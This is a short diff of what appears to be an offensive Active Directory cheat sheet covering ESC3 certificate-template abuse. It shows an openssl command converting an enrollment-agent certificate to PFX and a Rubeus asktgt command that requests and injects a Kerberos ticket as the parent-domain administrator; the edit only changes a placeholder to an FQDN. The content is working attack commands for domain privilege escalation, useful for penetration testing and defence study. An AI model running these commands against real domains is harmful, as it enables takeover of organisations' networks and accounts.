@@ -32,4 +32,4 @@ Request an enrollment agent certificate and use it to request cert on behalf of 
   </code></pre>
 * Convert from cert.pem to pfx, request EA TGT
   * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`
-* `Rubeus.exe asktgt /user:<parent-domain>\administrator /certificate:esc3user.pfx /dc:<parent-domain-dc> /ptt (/password:SecretPass@123) - optional`
+* `Rubeus.exe asktgt /user:<parent-domain-FQDN>\administrator /certificate:esc3user.pfx /dc:<parent-domain-dc> /ptt (/password:SecretPass@123) - optional`
